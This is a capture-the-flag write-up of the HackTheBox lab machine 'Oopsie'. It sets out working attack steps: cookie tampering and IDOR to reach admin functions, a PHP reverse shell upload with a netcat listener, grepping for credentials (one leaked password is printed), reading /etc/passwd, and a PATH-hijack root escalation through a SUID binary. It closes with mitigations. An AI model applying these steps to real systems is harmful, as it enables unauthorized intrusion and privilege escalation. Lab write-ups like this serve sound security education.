# Oopsie - HackTheBox Writeup

| Field | Details |
|-------|---------|
| Name | Oopsie |
| OS | Linux |
| Difficulty | Easy |
| Category | Machine |
| Points | N/A |
| Status | Pwned |
| Date | 2026-03-26 |

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Post-Exploitation / Privilege Escalation](#post-exploitation--privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)
8. [References](#references)

---

## Summary

Oopsie is an Easy Linux machine focused on broken access control and privilege escalation fundamentals. By manipulating user identifiers and role cookies, admin-only functionality became accessible, enabling malicious PHP upload and remote code execution. Initial access as `www-data` led to credential discovery, lateral movement to `robert`, and final root escalation through a SUID binary vulnerable to PATH hijacking.

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV 10.129.95.191
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Web server |

Initial web visit showed an automotive-themed page with no immediately obvious attack surface.

---

## Enumeration

### Web Enumeration (Burp Suite)

Used Burp Suite passive crawling/spidering to enumerate hidden paths.

Discovered endpoint:

```text
/cdn-cgi/login
```

This exposed a login portal.

### Guest Access

Used "Login as Guest" to enter a limited dashboard.

Observed:

- Uploads functionality existed but appeared restricted to admin users.

### Access Control Weakness Discovery

From browser developer tools and request patterns:

- Cookie values indicated role and user context.
- URL parameterized account IDs were directly exposed.

Examples observed:

```text
role=guest
user=2233
admin.php?content=accounts&id=2
```

---

## Exploitation

### Vulnerability

**Category:** Broken Access Control + Insecure Direct Object Reference (IDOR)

**Description:**
Authorization relied on client-controlled cookie values (`role`, `user`) and predictable account IDs in URL parameters. By modifying these values, it was possible to escalate privileges and access admin-only functionality.

### Proof of Concept

1. Enumerated user IDs through account endpoint:

```text
id=1
```

2. Modified cookies to impersonate an admin context:

```text
role=admin
user=34322
```

3. Gained access to restricted Uploads page.

### File Upload to RCE

Uploaded PHP reverse shell payload using:

```text
/usr/share/webshells/php/php-reverse-shell.php
```

Configured payload callback:

- Attacker IP: set to local VPN IP
- Port: chosen listener port

### Upload Path Discovery

Used Gobuster to identify uploaded file location:

```bash
gobuster dir -u http://10.129.95.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

Found:

```text
/uploads
```

### Reverse Shell Access

Started listener:

```bash
nc -lvnp 1234
```

Triggered shell by browsing:

```text
http://10.129.95.191/uploads/php-reverse-shell.php
```

Received shell as:

- `www-data`

Upgraded TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Post-Exploitation / Privilege Escalation

### Credential Harvesting

Searched local files for password patterns:

```bash
cat * | grep -i passw*
```

Discovered credential:

```text
MEGACORP_4dm1n!!
```

Enumerated users:

```bash
cat /etc/passwd
```

Identified local user:

- `robert`

Switched user:

```bash
su robert
```

### User Flag

Retrieved from:

```text
/home/robert/
```

### Privilege Escalation via SUID + PATH Hijack

#### Step 1 - Find potential escalation binary

```bash
find / -group bugtracker 2>/dev/null
```

Found:

```text
/usr/bin/bugtracker
```

Checked permissions:

```bash
ls -la /usr/bin/bugtracker
```

Observed SUID bit and privileged execution behavior.

#### Step 2 - Identify vulnerable execution pattern

The binary called `cat` without absolute path, making it vulnerable to PATH hijacking.

#### Step 3 - Exploit PATH hijack

Created malicious `cat` in writable directory:

```bash
echo "/bin/sh" > /tmp/cat
chmod +x /tmp/cat
```

Prepended `/tmp` to PATH:

```bash
export PATH=/tmp:$PATH
```

Executed vulnerable binary:

```bash
/usr/bin/bugtracker
```

Root shell obtained successfully.

### Root Flag

Retrieved from:

```text
/root/
```

---

## Flags

| Flag | Value |
|------|-------|
| User flag | Retrieved from `/home/robert/` |
| Root flag | Retrieved from `/root/` |

---

## Key Takeaways

- **Broken access control is critical:** Client-side role and user controls must never be trusted.
- **Information disclosure amplifies risk:** Exposed IDs and predictable objects can enable privilege escalation.
- **File upload attack surface:** Any upload feature should enforce strict validation and execution controls.
- **Credential reuse impact:** Reused credentials can enable quick lateral movement between users/services.
- **SUID + PATH hijack:** Privileged binaries executing non-absolute commands are strong escalation vectors.
- **Techniques used:** Burp endpoint discovery, cookie tampering, IDOR enumeration, web shell upload, reverse shell handling, credential harvesting, SUID PATH hijacking.
- **Tools used:** Nmap, Burp Suite, Gobuster, Netcat, PHP reverse shell.
- **Mitigations:**
  - Enforce server-side authorization checks for every privileged action.
  - Remove sensitive metadata and direct object references from user-controlled contexts.
  - Harden upload functionality (type validation, content scanning, non-executable storage).
  - Audit and rotate credentials; avoid reuse across users and services.
  - Ensure privileged binaries use absolute command paths and safe execution primitives.

---

## References

- https://app.hackthebox.com
- https://owasp.org/www-project-top-ten/
- https://gtfobins.github.io/
